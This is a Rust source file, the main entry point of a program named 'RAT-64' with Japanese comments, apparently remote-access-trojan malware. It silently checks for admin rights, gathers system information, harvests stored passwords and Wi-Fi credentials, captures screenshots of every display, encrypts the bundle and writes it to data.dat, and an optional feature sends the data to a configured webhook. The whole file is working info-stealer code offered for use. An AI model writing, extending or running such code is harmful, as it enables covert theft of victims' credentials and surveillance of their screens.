// RAT-64 最適化版メインエントリポイント
use rmp_serde::encode::to_vec as to_msgpack_vec;
// Base64機能は削除されました (key.dat保存機能削除のため)
use rand::RngCore;

use rat_64::{collect_auth_data_with_config, encrypt_data_with_key, is_admin};

#[cfg(feature = "screenshot")]
use rat_64::modules::screen_capture::{capture_screenshot, capture_all_displays, ScreenshotConfig};

// スクリーンショット収集統合版
fn collect_screenshots() -> rat_64::ScreenshotData {
    let capture_time = format!("{:?}", std::time::SystemTime::now());
    
    #[cfg(feature = "screenshot")]
    {
        let config = ScreenshotConfig::default();
        let primary_display = capture_screenshot(&config)
            .map(Some)
            .unwrap_or(None);
        
        let all_displays = capture_all_displays(&config)
            .unwrap_or_else(|_| Vec::new());
        
        let primary_count = if primary_display.is_some() { 1 } else { 0 };
        rat_64::ScreenshotData {
            primary_display,
            total_count: all_displays.len() + primary_count,
            all_displays,
            capture_time,
        }
    }
    
    #[cfg(not(feature = "screenshot"))]
    {
        rat_64::ScreenshotData {
            primary_display: None,
            all_displays: Vec::new(),
            capture_time,
            total_count: 0,
        }
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // 権限チェック（サイレント）
    let _admin_mode = is_admin();
    
    // 統合モジュールシステムまたはコア機能を実行
    let args: Vec<String> = std::env::args().collect();
    if args.len() > 1 && args[1] == "--integrated" {
        execute_integrated_system()
    } else {
        execute_rat_core()
    }
}

fn execute_rat_core() -> Result<(), Box<dyn std::error::Error>> {
    let config = rat_64::load_config_or_default();
    
    // Webhook機能優先実行
    #[cfg(feature = "webhook")]
    if config.webhook_enabled && !config.webhook_url.is_empty() {
        return rat_64::run_with_webhook(&config)
            .map_err(|e| format!("Webhook実行エラー: {}", e).into());
    }
    
    // システム情報収集
    let system_info = rat_64::get_system_info()
        .map_err(|e| format!("システム情報収集エラー: {}", e))?;
    
    // 認証情報収集
    let auth_data = if config.collect_auth_data {
        collect_auth_data_with_config(&config)
    } else {
        rat_64::AuthData { passwords: Vec::new(), wifi_creds: Vec::new() }
    };

    // スクリーンショット収集
    let screenshot_data = if config.collect_screenshots {
        collect_screenshots()
    } else {
        rat_64::ScreenshotData {
            primary_display: None,
            all_displays: Vec::new(),
            capture_time: format!("{:?}", std::time::SystemTime::now()),
            total_count: 0,
        }
    };

    // データ統合とシリアライゼーション
    #[derive(serde::Serialize)]
    struct FullData {
        system_info: rat_64::SystemInfo,
        auth_data: rat_64::AuthData,
        screenshot_data: rat_64::ScreenshotData,
    }
    
    let full_data = FullData { system_info, auth_data, screenshot_data };
    let data = to_msgpack_vec(&full_data)?;
    
    // 暗号化キー生成と暗号化
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    rand::rng().fill_bytes(&mut key);
    rand::rng().fill_bytes(&mut nonce);

    let encrypted_data = encrypt_data_with_key(&data, &key, &nonce)?;
    
    // 暗号化データ保存のみ（key.dat機能は削除）
    save_data_only(&encrypted_data)?;
    
    Ok(())
}

// 統合ファイル保存関数
fn save_data_only(encrypted_data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    // 暗号化データ保存のみ
    std::fs::write("data.dat", encrypted_data)?;
    Ok(())
}

fn execute_integrated_system() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(any(feature = "browser", feature = "screenshot", feature = "webhook"))]
    {
        let config = rat_64::load_config_or_default();
        let auth_data = collect_auth_data_with_config(&config);
        let serialized_data = rmp_serde::to_vec(&auth_data)?;
        
        // キー生成と暗号化
        let mut key = [0u8; 32];
        let mut nonce = [0u8; 12];
        rand::rng().fill_bytes(&mut key);
        rand::rng().fill_bytes(&mut nonce);
        
        let encrypted_data = encrypt_data_with_key(&serialized_data, &key, &nonce)?;
        
        // ファイル保存（データのみ）
        save_data_only(&encrypted_data)?;
        
        Ok(())
    }
    
    #[cfg(not(any(feature = "browser", feature = "screenshot", feature = "webhook")))]
    {
        Err("統合モジュールシステムが利用できません".into())
    }
}
